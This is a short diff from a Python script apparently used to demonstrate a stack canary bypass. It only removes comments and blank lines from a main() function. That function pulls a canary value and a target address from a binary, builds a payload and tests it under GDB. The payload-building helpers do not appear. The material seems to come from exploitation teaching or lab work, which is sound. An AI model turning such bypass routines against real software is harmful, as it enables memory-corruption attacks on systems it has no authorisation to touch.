@@ -57,19 +57,13 @@ def test_payloads(payload_variants, binary_path):
 
 def main():
     print("Starting Stack Canary Bypass demonstration...")
-
     canary, _, deadcode_address = analyze_binary(BINARY_PATH)
     canary = int(canary, 16)
     deadcode_address = int(deadcode_address, 16)
 
     payload = create_payload(canary, deadcode_address)
-
-    # Visualize initial memory layout
     visualize_memory_layout(canary, deadcode_address)
-
-    # Test the payload
     test_payloads([payload], BINARY_PATH)
-
     print("Exploit attempt completed. Check GDB output for details.")
 
 if __name__ == "__main__":
